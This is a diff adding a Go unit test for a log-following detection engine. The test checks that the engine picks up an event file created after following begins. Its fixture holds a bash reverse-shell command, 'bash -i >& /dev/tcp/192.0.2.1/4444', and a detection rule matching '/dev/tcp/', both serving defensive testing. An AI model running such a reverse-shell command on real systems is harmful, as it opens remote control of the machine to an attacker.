@@ -102,3 +102,51 @@ detection:
 		t.Fatalf("latency %v implausible (want a small positive capture-to-match duration)", lastLat)
 	}
 }
+
+// TestStreamFollowSelfHealsWhenSinkAppearsAfterArming is the deployed failure in a unit: banken
+// began following before the sensor had ever created its sink -- the directory and file are both
+// absent when the follow is armed, so neither inotify watch (file, or parent-dir) can be set. Only
+// the safety-net re-drain can then pick the stream up once the sensor finally writes it. Without
+// that floor the follow blocks forever and no alert fires.
+func TestStreamFollowSelfHealsWhenSinkAppearsAfterArming(t *testing.T) {
+	root := t.TempDir()
+	sub := filepath.Join(root, "private", "mimi") // absent at arm time, like a not-yet-created LogsDirectory
+	path := filepath.Join(sub, "events.jsonl")
+	statePath := filepath.Join(root, "cursor.json")
+
+	r := testRule(t, `title: reverse shell
+detection:
+  sel:
+    CommandLine|contains: /dev/tcp/
+  condition: sel`)
+	sink := &syncSink{}
+	eng := New([]*sigma.Rule{r}, nil, alert.NewDispatcher(sink))
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+	done := make(chan error, 1)
+	go func() { done <- eng.StreamFollow(ctx, parser.Mimi{}, path, statePath, nil) }()
+
+	time.Sleep(200 * time.Millisecond) // let it arm and fail to watch anything
+	if err := os.MkdirAll(sub, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	line := `{"schema":"mimi/2","time":"` + time.Now().UTC().Format(time.RFC3339Nano) +
+		`","process":{"pid":42,"name":"bash","cmd_line":"bash -i >& /dev/tcp/192.0.2.1/4444",` +
+		`"file":{"path":"/usr/bin/bash"},"user":{"uid":"0"}},"ancestry":[{"pid":42,"name":"bash"}]}` + "\n"
+	if err := os.WriteFile(path, []byte(line), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	deadline := time.Now().Add(4 * time.Second)
+	for sink.n() < 1 && time.Now().Before(deadline) {
+		time.Sleep(10 * time.Millisecond)
+	}
+	cancel()
+	if err := <-done; err != nil && err != context.Canceled {
+		t.Fatalf("StreamFollow returned %v", err)
+	}
+	if sink.n() != 1 {
+		t.Fatalf("dispatched %d alerts, want 1 -- banken did not pick up a sink created after arming (safety-net re-drain missing?)", sink.n())
+	}
+}
